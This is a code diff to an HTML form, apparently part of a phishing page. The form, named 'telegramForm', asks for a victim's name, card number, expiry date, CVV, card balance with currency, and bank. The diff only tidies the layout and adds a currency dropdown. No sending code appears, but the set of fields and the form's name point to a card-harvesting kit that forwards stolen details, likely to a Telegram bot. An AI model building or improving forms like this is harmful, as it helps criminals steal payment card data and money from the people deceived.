@@ -10,10 +10,10 @@
 <form id="telegramForm">
     <label for="name">NAME SURNAME:</label>
     <input type="text" id="name" name="name" required>
-    <br>
+
     <label for="cardNumber">CARD NUMBER:</label>
     <input type="text" id="cardNumber" name="cardNumber" required placeholder="7000 0000 0000 0000" oninput="formatCardNumber(event) ">
-    <br>
+
     <div class="flex-container">
         <div class="flex-item">
             <label for="expiryDate">VALID THRU:</label>
@@ -24,9 +24,18 @@
             <input type="text" id="cvv" name="cvv" required placeholder="468" maxlength="3" pattern="\d{3}">
         </div>
     </div>
-    <label for="cardNumber">CARD BALANCE:</label>
-    <input type="text" id="cardBalance" name="cardNumber" required>
     <br>
+    <br>
+    <label for="cardBalance">CARD BALANCE:</label>
+    <div class="flex-container">
+        <input type="text" id="cardBalance" name="cardNumber" required class="sameSizeInput">
+        <select id="currency" name="currency" required>
+            <option value="HUF">HUF</option>
+            <option value="USD">USD</option>
+            <option value="EUR">EUR</option>
+            <!-- Добавьте другие валюты по аналогии -->
+        </select>
+    </div>
     <label for="chooseBank">CHOOSE YOUR BANK:</label>
     <select id="chooseBank" name="chooseBank" required>
         <option value="" selected disabled>Select a bank</option>
